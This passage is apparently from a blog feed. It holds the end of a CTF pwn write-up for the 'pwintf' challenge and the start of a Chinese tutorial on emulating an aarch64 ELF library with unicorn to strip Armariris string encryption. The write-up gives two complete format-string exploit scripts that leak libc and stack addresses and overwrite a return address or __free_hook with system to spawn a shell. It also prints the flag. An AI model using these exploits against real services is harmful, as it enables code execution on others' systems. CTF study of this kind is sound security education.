enabled</span><br><span class="line">#    PIE:      PIE enabled</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def log_print(*msg):</span><br><span class="line">    log.info(&quot; &quot;.join(map(str,msg)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def int2byte(x: int):</span><br><span class="line">    return x.to_bytes(exe.bytes, &quot;little&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def wait_for_debugger(io):</span><br><span class="line">    if args.LOCAL and input(&quot;debugger?&quot;) == &quot;y\n&quot;:</span><br><span class="line">        pid = util.proc.pidof(io)[0]</span><br><span class="line">        log_print(&quot;The pid is: &quot; + str(pid))</span><br><span class="line">        util.proc.wait_for_debugger(pid)</span><br><span class="line">        log_print(&quot;press enter to continue&quot;)</span><br><span class="line"></span><br><span class="line"># ======== gadget stuff =========</span><br><span class="line">ret_addr = exe_rop.find_gadget([&#x27;ret&#x27;])[0]</span><br><span class="line"># ============================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ======== libc stuff =========</span><br><span class="line">libc_bin_sh_offset = next(libc.search(b&quot;/bin/sh&quot;))</span><br><span class="line">log_print(&quot;libc /bin/sh offset&quot;, hex(libc_bin_sh_offset))</span><br><span class="line">libc_printf_offset = libc.sym[&quot;printf&quot;]</span><br><span class="line">log_print(&quot;libc printf offset&quot;, hex(libc_printf_offset))</span><br><span class="line">libc_system_offset = libc.sym[&quot;system&quot;]</span><br><span class="line">log_print(&quot;libc system offset&quot;, hex(libc_system_offset))</span><br><span class="line">libc_start_main_ret_offset = libc.libc_start_main_return</span><br><span class="line">log_print(&quot;libc_start_main_ret_offset&quot;, hex(libc_start_main_ret_offset))</span><br><span class="line"># ============================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">lp = log_print</span><br><span class="line">wait_for_debugger(io)</span><br><span class="line"></span><br><span class="line">def read_stack_at(offset):</span><br><span class="line">    io.sendline(b&quot;%%%d$p&quot;%(offset+6))</span><br><span class="line">    a = io.recvuntil(b&quot;0x&quot;)</span><br><span class="line">    return int(io.recv()[:-1:],16) &amp; 0xffffffffffffffff</span><br><span class="line"></span><br><span class="line">def read_data_at(offset):</span><br><span class="line">    io.sendline(b&quot;%%%d$x&quot;%(offset+6))</span><br><span class="line">    a = io.recvuntil(b&quot;0x&quot;)</span><br><span class="line">    return int(io.recv()[:-1:],16) &amp; 0xffffffffffffffff</span><br><span class="line"></span><br><span class="line">def write_stack_at(offset,data,number_of_bytes):</span><br><span class="line">    byte_format = b&quot;n&quot;</span><br><span class="line">    if number_of_bytes == 2:</span><br><span class="line">        byte_format = b&#x27;hn&#x27;</span><br><span class="line">    if number_of_bytes == 1:</span><br><span class="line">        byte_format = b&#x27;hhn&#x27;</span><br><span class="line">    io.sendline(b&quot;%%%dx%%%d$%s|IENDL&quot;%(data,offset+6,byte_format))</span><br><span class="line">    io.recvuntil(b&#x27;IENDL&#x27;)</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line">soffset_to_stack_35 = 7</span><br><span class="line">soffset_stack_35 = 35</span><br><span class="line">soffset_stack_vuln_rip = 3</span><br><span class="line">soffset_libc_start_main_ret = 5</span><br><span class="line"></span><br><span class="line"># lp(&quot;free hook addr&quot;,hex(libc.sym[&quot;__free_hook&quot;]))</span><br><span class="line"></span><br><span class="line">lp(io.recv())</span><br><span class="line"></span><br><span class="line">current_rsp_addr = read_stack_at(0) - 0x20</span><br><span class="line">lp(&quot;current rsp addr&quot;, hex(current_rsp_addr))</span><br><span class="line"># address of mov eax,0 at sym.main</span><br><span class="line">program_base_addr = read_stack_at(soffset_stack_vuln_rip) - (exe.sym[&quot;main&quot;] + 0x44)</span><br><span class="line">lp(&quot;program base addr&quot;, hex(program_base_addr))</span><br><span class="line">libc_base_addr = read_stack_at(soffset_libc_start_main_ret) - libc_start_main_ret_offset</span><br><span class="line">lp(&quot;libc base addr&quot;, hex(libc_base_addr))</span><br><span class="line">lp(&quot;/bin/sh&quot;, hex(libc_base_addr+libc_bin_sh_offset))</span><br><span class="line">pop_3_stack_ret_addr = program_base_addr + 0x131f</span><br><span class="line">pop_rbp_r12_r13_r14_r15_ret_addr = program_base_addr + 0x131b</span><br><span class="line">lp(&quot;pop_3_stack_ret_addr&quot;, hex(pop_3_stack_ret_addr))</span><br><span class="line">lp(&quot;pop_rbp_r12_r13_r14_r15_ret_addr&quot;, hex(pop_rbp_r12_r13_r14_r15_ret_addr))</span><br><span class="line"></span><br><span class="line">printf_rip_addr = current_rsp_addr - 0x8</span><br><span class="line">lp(&quot;printf rip addr&quot;, hex(printf_rip_addr))</span><br><span class="line"></span><br><span class="line"># one gadget r15,rdx == null</span><br><span class="line">one_gadget_addr = libc_base_addr + 0xe6c81</span><br><span class="line">lp(&quot;one gadget addr&quot;,hex(one_gadget_addr))</span><br><span class="line"></span><br><span class="line">stack_libc_start_main_ret_addr = current_rsp_addr + soffset_libc_start_main_ret * 0x8</span><br><span class="line">write_stack_at(soffset_to_stack_35,(stack_libc_start_main_ret_addr) &amp; 0xffff,2)</span><br><span class="line">write_stack_at(soffset_stack_35, one_gadget_addr &amp; 0xffff,2)</span><br><span class="line">write_stack_at(soffset_to_stack_35,(stack_libc_start_main_ret_addr+0x2) &amp; 0xffff,2)</span><br><span class="line">write_stack_at(soffset_stack_35, (one_gadget_addr &gt;&gt; 16) &amp; 0xffff,2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_stack_at(soffset_to_stack_35, printf_rip_addr &amp; 0xffff,2)</span><br><span class="line"># read_stack_at(soffset_stack_35)</span><br><span class="line">write_stack_at(soffset_stack_35, pop_rbp_r12_r13_r14_r15_ret_addr &amp; 0xffff,2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="write-rop-to-chain-to-free-hook-intended-solution"><a href="#write-rop-to-chain-to-free-hook-intended-solution" class="headerlink" title="write rop to chain to free_hook (intended solution)"></a>write rop to chain to free_hook (intended solution)</h2><p>after discuss with the author of the challenge. The intended solution for this one is actually using another debug feature - <strong>free_hook</strong></p>
<p>So basically, libc have an writable function address called <code>__free_hook</code>. the function will be called every time <code>free()</code> is called. </p>
<p>Therefore, by write address into <code>__free_hook</code>, we can escape from while loop and get into a rop chain</p>
<h3 id="exploit-py-1"><a href="#exploit-py-1" class="headerlink" title="exploit.py"></a>exploit.py</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template --host localhost --port 1442 pwintf</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;pwintf&#x27;)</span><br><span class="line">libc = ELF(&#x27;libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;localhost&#x27;</span><br><span class="line">port = int(args.PORT or 1442)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Full RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      PIE enabled</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">io.sendline(b&quot;%11$p\n%6$p\n%13$p&quot;)</span><br><span class="line"></span><br><span class="line">libc.address = int(io.recvuntil(b&quot;\n&quot;, drop=True), 0) - libc.libc_start_main_return</span><br><span class="line">stack_addr_0 = int(io.recvuntil(b&quot;\n&quot;, drop=True), 0) - 0x20</span><br><span class="line">stack_addr_1 = int(io.recvuntil(b&quot;\n&quot;, drop=True), 0)</span><br><span class="line"></span><br><span class="line">stack_offset = 6 + (stack_addr_1 - stack_addr_0) // 8</span><br><span class="line"></span><br><span class="line">io.info(&quot;Libc: &quot; + hex(libc.address))</span><br><span class="line">io.info(&quot;Stack 0: &quot; + hex(stack_addr_0))</span><br><span class="line">io.info(&quot;Stack 1: &quot; + hex(stack_addr_1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write_on_stack(value, offset):</span><br><span class="line">    for i in range(4):</span><br><span class="line">        io.sendline(&quot;%&#123;&#125;c%13$hn&quot;.format((stack_addr_0 + 8 * (offset - 6) + 2 * i) % 0x10000).encode())</span><br><span class="line">        io.recvline(1)</span><br><span class="line"></span><br><span class="line">        chars = (value // (0x10000 ** i)) % 0x10000</span><br><span class="line">        if chars == 0:</span><br><span class="line">            io.sendline(&quot;%&#123;&#125;$hn&quot;.format(stack_offset).encode())</span><br><span class="line">        else:</span><br><span class="line">            io.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;.format(chars, stack_offset).encode())</span><br><span class="line">        io.recvline(1)</span><br><span class="line"></span><br><span class="line">print(hex(libc.address))</span><br><span class="line"></span><br><span class="line">write_on_stack(libc.sym[&#x27;__free_hook&#x27;], 8)</span><br><span class="line">write_on_stack(libc.sym[&#x27;__free_hook&#x27;] + 2, 9)</span><br><span class="line">write_on_stack(libc.sym[&#x27;__free_hook&#x27;] + 4, 10)</span><br><span class="line">write_on_stack(libc.sym[&#x27;__free_hook&#x27;] + 6, 11)</span><br><span class="line"></span><br><span class="line">target = libc.sym[&#x27;system&#x27;]</span><br><span class="line">payload = &quot;/bin/bash #&quot;</span><br><span class="line">written = len(payload)</span><br><span class="line"></span><br><span class="line">chars = ((target % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000</span><br><span class="line">written += chars</span><br><span class="line">payload += &quot;%&#123;&#125;c&quot;.format(chars)</span><br><span class="line">payload += &quot;%8$hn&quot;</span><br><span class="line"></span><br><span class="line">chars = (((target // 0x10000) % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000</span><br><span class="line">written += chars</span><br><span class="line">payload += &quot;%&#123;&#125;c&quot;.format(chars)</span><br><span class="line">payload += &quot;%9$hn&quot;</span><br><span class="line"></span><br><span class="line">chars = (((target // 0x100000000) % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000</span><br><span class="line">written += chars</span><br><span class="line">payload += &quot;%&#123;&#125;c&quot;.format(chars)</span><br><span class="line">payload += &quot;%10$hn&quot;</span><br><span class="line"></span><br><span class="line">chars = (((target // 0x1000000000000) % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000</span><br><span class="line">written += chars</span><br><span class="line">payload += &quot;%&#123;&#125;c&quot;.format(chars)</span><br><span class="line">payload += &quot;%11$hn&quot;</span><br><span class="line"></span><br><span class="line">io.sendline(payload.encode())</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>maple{h0p3_1t_d1dnt_t4k3_l0ng}</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>如何模拟执行一个elf文件</title>
    <url>/articles/ctf/how-to-emulate-elf-file-from-zero/</url>
    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>在尝试逆向一个动态链接库的时候，有时你可能希望单独运行某个函数，以探究它的具体作用。</p>
<p>如果这个二进制文件的编译架构与你的机器架构相同，并且你拥有其所有依赖库，那么操作相对简单：直接使用<code>dlopen</code>加载动态库，然后通过 offset 获取函数地址，执行即可。</p>
<p>然而，如果遇到不同架构的二进制文件，比如 aarch64 架构，应如何方便地进行调试和模拟运行呢？</p>
<p>一种常见的方法是在相应架构上启动<code>gdbserver</code>或使用<code>frida</code>等类似工具进行跟踪。但这种方法过于笨重。是否存在一种更轻量级的方法来模拟运行这个 ELF 文件呢？</p>
<p><em>unicorn模拟运行</em>, <em>外加elf简单介绍</em></p>
<span id="more"></span>

<h1 id="从去除字符串加密开始"><a href="#从去除字符串加密开始" class="headerlink" title="从去除字符串加密开始"></a>从去除字符串加密开始</h1><p>让我们从我们的sample文件<code>libkpk.so</code>开始，这个库文件了包含了一个需要被逆向出来的加密算法。</p>
<p><code>libkpk.so</code>是一个从安卓安装包里提取出来的库文件，根据反编译可以发现，这里面应该包含有三个函数，分别是<code>fetch</code>,<code>isKpk</code>和<code>kpk</code>，java通过jni来调用这几个函数。在这些函数中，我们重点关系的是<code>kpk</code>函数，这个函数是作为加密函数出现的，</p>
<p><img data-src="/images/ctf/how-to-emulate-elf-file-from-zero/Screenshot_20240704_100209.png"></p>
<p>但是在这个二进制里，并没有找到任何和加密有关的字符串，即使有字符串，这些字符串也是已一种非常诡异的状态出现的。</p>
<p><img data-src="/images/ctf/how-to-emulate-elf-file-from-zero/Screenshot_20240704_101455.png"></p>
<p>在观察这些诡异的字符串后，发现这些字符串都会在最开始被<code>init_array</code>里面的<code>.datadiv_decodexxx</code>函数修改，所以我们可以合理推断这些<code>datadiv_decode</code>函数就是解密函数，用在lib被加载的时候来解密被加密的字符串。</p>
<p><img data-src="/images/ctf/how-to-emulate-elf-file-from-zero/Screenshot_20240704_102035.png"></p>
<p>在经过搜索之后，可以发现<code>datadiv_decode</code>正是被<a href="https://github.com/GoSSIP-SJTU/Armariris">Armariris</a>进行字符串混淆后会出现的解密函数</p>
<h2 id="Armariris混淆"><a href="#Armariris混淆" class="headerlink" title="Armariris混淆"></a>Armariris混淆</h2><p>Armariris是上海交通大学开发的基于llvm的混淆框架，开源在<a href="https://github.com/GoSSIP-SJTU/Armariris">https://github.com/GoSSIP-SJTU/Armariris</a></p>
<p>armariris的字符串加密逻辑比较简单，“对于所有的常量字符串，先创建一份可读写的、类型相同、大小相同的全局变量，将原先的字符串xor随机数，存放到这块新的全局变量里<a href="#Reference">[1]</a>”。</p>
<p>解密也比较简单，把解密字符串的逻辑写到对应的解密的函数里，接下来只要在lib加载的时候，跑一下解密函数就行了。</p>
<h2 id="详细步骤"><a href="#详细步骤" class="headerlink" title="详细步骤"></a>详细步骤</h2><p>所以，解密的方法可以被概括为</p>
<ol>
<li>加载elf到内存</li>
<li>模拟运行解密函数</li>
<li>保存解密后的字符串，覆盖掉原来加密的字符串</li>
<li>删掉所有的解密函数</li>
</ol>
<p>然而，由于这个二进制是在是在<code>aarch64</code>下编译的，而我们的电脑是amd64的，没办法直接运行。这个时候，我们可以使用<code>unicorn</code>来模拟运行程序。</p>
<p><code>unicorn</code>基于<code>qemu</code>，但是更加轻量级，提供了一个多个架构下模拟cpu运行的接口，非常适合在这个地方使用。</p>
<p>那么我们就可以开始惹。</p>
<h3 id="Step-1-加载elf到内存中"><a href="#Step-1-加载elf到内存中" class="headerlink" title="Step 1: 加载elf到内存中"></a>Step 1: 加载elf到内存中</h3><p>第一部，我们需要加载elf文件到内存中，要完成这个，我们需要把elf文件里所有<code>PT_LOAD</code> segment标示的内存区域从文件中读取并写入相对应的内存地址。</p>
<p>在64位下，program header的定义如下。当<code>p_type</code>&#x3D;<code>PT_LOAD</code>即代表该段为可装载段，表示即这个段将被装载或映射到内存中，其中<code>p_offset</code>代表该段在文件中的位置，<code>p_filesz</code>代表该段的长度。<code>p_vaddr</code>为数据映射到虚拟内存中的地址，<code>p_flags</code>代表这段区域的读写执行权限。当然因为我们是在cpu模拟机下执行，我们根本不关心他的权限，所以全部设置为<code>rwx</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        Elf64_Word      p_type;</span><br><span class="line">        Elf64_Word      p_flags;</span><br><span class="line">        Elf64_Off       p_offset;</span><br><span class="line">        Elf64_Addr      p_vaddr;</span><br><span class="line">        Elf64_Addr      p_paddr;</span><br><span class="line">        Elf64_Xword     p_filesz;</span><br><span class="line">        Elf64_Xword     p_memsz;</span><br><span class="line">        Elf64_Xword     p_align;</span><br><span class="line">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://docs.oracle.com/cd/E19683-01/816-7777/chapter6-83432/index.html">https://docs.oracle.com/cd/E19683-01/816-7777/chapter6-83432/index.html</a></p>
</blockquote>
<p>在了解了基本概念后，我们就可以把elf对应的段加载到内存里了。如下代码所示，<code>get_mapping_address</code>会计算出这块内存需要mmap哪一块内存地址，并对齐page size，也就是0x1000。然后<code>mmap</code>并写入数据就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> seg <span class="keyword">in</span> lib.iter_segments_by_type(<span class="string">&#x27;PT_LOAD&#x27;</span>):</span><br><span class="line">    st_addr, size = get_mapping_address(seg)</span><br><span class="line">    <span class="comment"># don&#x27;t care, rwx everywhere</span></span><br><span class="line">    emulator.mem_map(lib.address + st_addr, size, UC_PROT_ALL)</span><br><span class="line">    emulator.mem_write(lib.address + seg.header.p_vaddr, seg.data())</span><br><span class="line">    log.info(<span class="string">&quot;loaded segment 0x%x-0x%x to memory 0x%x-0x%x&quot;</span>, seg.header.p_vaddr,seg.header.p_vaddr+seg.header.p_memsz, lib.address + st_addr, lib.address + st_addr+size)</span><br></pre></td></tr></table></figure>



<h3 id="Step-2-找到所有-datadiv-decode开头的函数并执行"><a href="#Step-2-找到所有-datadiv-decode开头的函数并执行" class="headerlink" title="Step 2: 找到所有.datadiv_decode开头的函数并执行"></a>Step 2: 找到所有.datadiv_decode开头的函数并执行</h3><p>这步比较简单，用pwntools的读取文件后，在symbol table里找到所有开头为<code>.datadiv_decode</code>的函数，然后执行即可。</p>
<p>在aarch64中，return pointer的寄存器为<code>LR</code>，在进入函数前，先设置<code>LR</code>，那么函数结束的时候就会跳回<code>LR</code>，我们在这里把<code>LR</code>设置为0，那么就知道当程序运行到0的时候，函数就结束了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">datadivs = []</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> lib.symbols:</span><br><span class="line">    <span class="keyword">if</span> name.startswith(<span class="string">&quot;.datadiv_decode&quot;</span>):</span><br><span class="line">        datadivs.append(name)</span><br><span class="line"><span class="keyword">for</span> datadiv <span class="keyword">in</span> datadivs:</span><br><span class="line">    log.info(<span class="string">&quot;[%s] Function %s invoke&quot;</span>, <span class="built_in">hex</span>(lib.symbols[datadiv]), datadiv)</span><br><span class="line">    emulator.reg_write(arm64_const.UC_ARM64_REG_LR, <span class="number">0</span>) <span class="comment"># 把return pointer (LR) 设置为0</span></span><br><span class="line">    emulator.emu_start(begin=lib.symbols[datadiv], until=<span class="number">0</span>)</span><br><span class="line">    log.info(<span class="string">&quot;[%s] Function return&quot;</span>,<span class="built_in">hex</span>(lib.symbols[datadiv]),)</span><br></pre></td></tr></table></figure>

<h3 id="Step-3-用解密后的数据patch掉原来加密的数据"><a href="#Step-3-用解密后的数据patch掉原来加密的数据" class="headerlink" title="Step 3: 用解密后的数据patch掉原来加密的数据"></a>Step 3: 用解密后的数据patch掉原来加密的数据</h3><p>这步也比较简单，因为所有的文本都在<code>.data</code>段里，直接把整个<code>.data</code>段覆盖掉就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">log.info(<span class="string">&quot;Patch .data section&quot;</span>)</span><br><span class="line">new_data = emulator.mem_read(lib.address + data_section_header.sh_addr, data_section_header.sh_size)</span><br><span class="line">libfile.seek(data_section_header.sh_offset)</span><br><span class="line">libfile.write(new_data)</span><br></pre></td></tr></table></figure>

<h3 id="Step-4-Patch掉所有的解密函数"><a href="#Step-4-Patch掉所有的解密函数" class="headerlink" title="Step 4: Patch掉所有的解密函数"></a>Step 4: Patch掉所有的解密函数</h3><p>这步也比较简单，直接让函数ret就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">log.info(<span class="string">&quot;Patch .datadiv_decode functions&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> datadiv <span class="keyword">in</span> datadivs:</span><br><span class="line">    libfile.seek(lib.symbols[datadiv] &amp; <span class="number">0xFFFFFFFE</span>)</span><br><span class="line">    ret = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ret = asm(shellcraft.ret())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="comment"># fallback to manual</span></span><br><span class="line">        ret = asm(<span class="string">&quot;ret&quot;</span>)</span><br><span class="line">    libfile.write(ret)</span><br></pre></td></tr></table></figure>



<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>把解密后的二进制拖入反编译软件，我们可以看到所有的字符串都已经被解密了，且对应的<code>JNINativeMethod</code>结构也比较好容易可以分辨出来。</p>
<p><img data-src="/images/ctf/how-to-emulate-elf-file-from-zero/Screenshot_20240704_134523.png"></p>
<p>找到了kpk对应的函数之后，就要考虑如何去模拟执行它了。</p>
<h1 id="ELF文件是怎么Load的"><a href="#ELF文件是怎么Load的" class="headerlink" title="ELF文件是怎么Load的"></a>ELF文件是怎么Load的</h1><p>在开始正式模拟运行之前，让我先来回顾一点基础知识，就是elf文件是怎么从加载到内存到运行的。</p>
<h2 id="Segment简单介绍"><a href="#Segment简单介绍" class="headerlink" title="Segment简单介绍"></a>Segment简单介绍</h2><p>通过<code>readelf -l libkpk.decrypt.so</code>我们可以读取ELF文件并获取到一些基本的信息，首先我们可以知道这个库文件是一个<strong>动态</strong>的共享库文件</p>
<p>他包含了几个关键的segment</p>
<p><code>PT_LOAD</code>: </p>
<p>在前文中提到了，<code>PT_LOAD</code>即可装载段，代表这类段会被加载到内存中。</p>
<p><code>PT_DYNAMIC</code>:</p>
<p>这段也非常重要，代表了所有需要在运行时进行重定向的内容。这些内容包含got表，全局变量重定向信息以及任何其他需要在运行时重定向的内容。</p>
<p>比如说，现在大部分程序运行的时候都会开启PIE(position-independent executable)，开启pie之后，程序的基值就不为0了，这个时候就需要通过重定向修正符号正确的地址。</p>
<p><img data-src="/images/ctf/how-to-emulate-elf-file-from-zero/Screenshot_20240704_144421.png"></p>
<p>如果一个二进制文件不是库文件而是一个<strong>动态的可执行文件</strong>，那么还会有另外一个重要的segment，<code>PT_INTERP</code></p>
<p><code>PT_INTERP</code></p>
<p>这个segment里存放了所需要的程序解释器（也就是<strong>动态链接器</strong>）的信息与位置。动态链接器的作用是加载可执行文件的共享库，并且解析可执行文件中使用的符号，以便在程序运行时正确地调用这些库函数。它在程序启动时将各个共享库加载到内存中，并根据需要将符号解析成实际的内存地址，使得程序可以顺利执行。</p>
<p><img data-src="/images/ctf/how-to-emulate-elf-file-from-zero/Screenshot_20240709_084101.png"></p>
<p>要注意的是，如果一个二进制文件是一个<strong>静态</strong>的可执行文件，简单来说，就是在build的时候加上<code>-static</code>参数的可执行文件，一般来说是没有<code>PT_DYNAMIC</code>和<code>PT_INTERP</code> segment的，因为没有必要。</p>
<p><img data-src="/images/ctf/how-to-emulate-elf-file-from-zero/Screenshot_20240709_085255.png"></p>
<h2 id="静态链接与动态链接"><a href="#静态链接与动态链接" class="headerlink" title="静态链接与动态链接"></a>静态链接与动态链接</h2><p>我们知道，elf可执行文件根据编译的时候链接方式可以分为两类：一个是静态程序，编译的时候使用静态链接，另一种是动态程序，编译的时候使用动态链接。</p>
<h3 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h3><p>静态链接就是在编译链接时直接将目标的代码（也就是生成的.o文件）和所引用的库文件的代码一起打包的可执行文件中。也就是说，可执行文件本身就包含了所需的所有代码。</p>
<p>所以，通过静态链接的程序在发布与运行的时候不需要依赖库，可以独立运行。但是相对的，由于静态链接把所有需要的库都打包了进去，生成的二进制的文件会比较大。</p>
<p><img data-src="/images/ctf/how-to-emulate-elf-file-from-zero/1433301-20210917095422002-1757216665.png"></p>
<blockquote>
<p>source: 创建静态库的过程 <a href="#Reference">14</a></p>
</blockquote>
<h3 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h3><p>动态链接是在编译时并不将所有目标代码和库文件的代码打包到可执行文件中，而是仅包含对这些库的引用信息。在程序运行时，<strong>动态链接器</strong>会根据这些引用信息找到并加载所需的共享库。</p>
<p><strong>编译时</strong>：编译器生成目标文件（.o 文件），并将动态库的引用信息嵌入到可执行文件中，而不是库的实际代码。</p>
<p><strong>链接时</strong>：链接器会将这些目标文件和必要的符号表一起打包生成最终的可执行文件。</p>
<p><strong>加载时</strong>：程序启动时，制定的动态链接器会根据可执行文件中的引用信息，查找并加载需要的共享库，将它们映射到进程的地址空间中。</p>
<p><strong>符号解析</strong>：动态链接器负责解析程序中使用的符号（例如函数调用和全局变量），将它们与加载的共享库中的实际地址进行匹配。</p>
<p><strong>重定位</strong>：对于那些需要在运行时确定的地址，动态链接器会进行必要的重定位操作，确保程序在内存中正确运行。</p>
<p><img data-src="/images/ctf/how-to-emulate-elf-file-from-zero/1433301-20210917100753673-547023515.png"></p>
<blockquote>
<p>source: 动态库链接过程 <a href="#Reference">14</a></p>
</blockquote>
<h2 id="ELF-LOOOADING"><a href="#ELF-LOOOADING" class="headerlink" title="ELF LOOOADING....."></a>ELF LOOOADING.....</h2><p>一个elf文件的loading也分情况讨论，如果需要加载的二进制文件是静态链接的，那么elf加载的过程相对来说就比较简单。</p>
<ol>
<li>首先把所有<code>PT_LOAD</code>端都加载到内存中，设置并初始化好stack</li>
<li>把pc(或者rip)指向elf头中的<code>entry</code>地址</li>
</ol>
<p>这样，一个静态elf文件就成功执行起来了。</p>
<p>但是，如果是动态链接的elf，那么就稍微比较复杂一点了，再加载完<code>PT_LOAD</code>端后还需要额外处理<code>PT_DYNAMIC</code>段修复重定向。</p>
<ol>
<li>首先把所有<code>PT_LOAD</code>端都加载到内存中，设置并初始化好stack</li>
<li>解析<code>PT_LOAD</code>并完成本程序内所有符号的重定向</li>
<li>加载所有依赖的动态库</li>
<li>根据重定位表（<code>.rel</code> 或 <code>.rela</code>），解析所有符号依赖，找到每个符号的实际地址，对符号引用进行重定位，修改内存中的代码或数据，使其指向正确的符号地址（包含即时绑定和懒绑定）。</li>
<li>把pc设置为<code>entry</code>，开始执行程序。</li>
</ol>
<p>当然，在实际应用中，除了第一步，其他的步骤都不需要程序本体进行。这些步骤一般会被系统的动态链接器完成。所以动态加载的程序在完成自身程序的加载后，会首先用同样的方法把动态链接器加载到内存中，然后向动态链接器传入对应的数据，之后，程序就不需要管了，只需要等待动态连接器完成所有的操作并把pc重新指向程序本体的<code>entry</code>就好了。</p>
<p>当然，在这里我们就不依赖动态链接器了，我们可以来手动实现程序的重定向</p>
<h3 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h3><p>首先第一步是读取<code>PT_DYNAMIC</code>段来拿到所有需要的信息。在64位下，<code>PT_DYNAMIC</code>端中的数据结构可以由如下数据结构表示。</p>
<p>其中<code>d_tag</code>相当于一个类型标识符，<code>d_un</code>由<code>d_tag</code>控制，内部的值根据<code>d_tag</code>的不同代表不同的值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Xword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf64_Xword     d_val;</span><br><span class="line">        Elf64_Addr      d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure>

